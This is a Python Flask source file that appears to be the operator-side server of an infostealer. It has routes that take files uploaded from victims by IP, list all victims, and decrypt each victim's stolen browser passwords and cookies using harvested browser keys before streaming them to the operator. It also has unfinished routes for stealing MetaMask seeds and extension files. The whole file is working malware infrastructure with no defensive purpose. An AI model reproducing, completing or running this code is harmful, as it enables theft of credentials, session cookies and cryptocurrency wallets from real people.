from flask import Flask, request, jsonify, Response
from models.victim import Victim
from models.crypto import CryptoOps


app = Flask(__name__)

crypt = CryptoOps()


def SendAsChunks(buffer, ChunkSize):
    """
    Sends a big buffer chunk by chunk.
    args:
        @buffer (Any): buffer that will be sent.
        @ChunkSize (int): the chunk size.
    """
    for i in range(0, len(buffer), ChunkSize):
        yield buffer[i:i + ChunkSize]


@app.route("/up", methods=["POST"])
def up():
    """
    Route for uploading files, the file then will be handled by the Victim class.
    """
    CurrentVictim = Victim(request.remote_addr)
    NameHeader = request.headers.get("name")
    FilePath = CurrentVictim.GetFileStoragePath(NameHeader)

    dataout = open(FilePath, 'wb')
    dataout.write(request.data)
    dataout.close()

    return '', 200


@app.route("/check", methods=["GET"])
def check():
    """
    route to check the cryptographic parameters.
    """
    message = request.headers.get("cc")
    message = crypt.DecryptBuffer(message)
    if message == "Are you ready?":
        response = crypt.EncryptBuffer("yes daddy.")
        response = {"cc": response}

        return "", 200, response
    else:
        return "", 400


@app.route("/GetAll", methods=["GET"])
def GetAll():
    """
    route for getting all victims detals

    return:
        List[dict] = list of dicts each contains information about victim's info
    """
    data = Victim(None).AllVictims
    data = crypt.EncryptBuffer(data)
    return Response(data, mimetype="text/plain", status=200)


@app.route("/GetVictimData", methods=["GET"])
def GetVictimData():
    """
    route to get a single victim browsers data.

    return:
        dict[list]: dict contains all browser data (passwords and cookies)
    """
    VictimIP = request.headers.get("TARGET")
    if VictimIP is not None:

        def GetKey(browser):
            KeyPath = CurrentVictim.GetFilePath(str(browser + 1), "KEY")

            file = open(KeyPath, "rb")
            key = file.read()
            file.close()

            return key

        def DecryptAndFormat(data, browser):
            key = GetKey(browser)

            for i in range(len(data)):
                NewData = []
                DataLen = len(data[i])
                for j in range(DataLen):
                    if j != (DataLen - 1):
                        NewData.append(data[i][j])
                PlainTextValue = crypt.DecryptBrowserCipher(key, data[i][-1])
                if PlainTextValue == b'':
                    PlainTextValue = "EMPTY"
                else:
                    PlainTextValue = PlainTextValue.decode("utf-8")
                NewData.append(PlainTextValue)
                data[i] = NewData

        VictimIP = crypt.DecryptBuffer(VictimIP)
        CurrentVictim = Victim(VictimIP)
        VictimData = CurrentVictim.GetVictimBrowserData()

        passwords = VictimData["PASSWORDS"]
        cookies = VictimData["COOKIES"]

        for browser in range(CurrentVictim.CurrentVictim["BrowserCount"]):
            data = passwords[browser]
            DecryptAndFormat(data, browser)
            passwords[browser] = data

            data = cookies[browser]
            DecryptAndFormat(data, browser)
            cookies[browser] = data

        VictimData = crypt.EncryptBuffer(VictimData)

        return Response(SendAsChunks(VictimData, 102400), status=200, content_type='text/plain')

    return 'sir t9awd', 400


@app.route("/GetExtentionSeed", methods=["GET"])
def GetMetamaskSeed():
    pass


@app.route("/GetExtentionFiles", methods=["GET"])
def GetExtentionFiles():
    pass


if __name__ == '__main__':
    app.run(host="0.0.0.0", port=1133, debug=True)
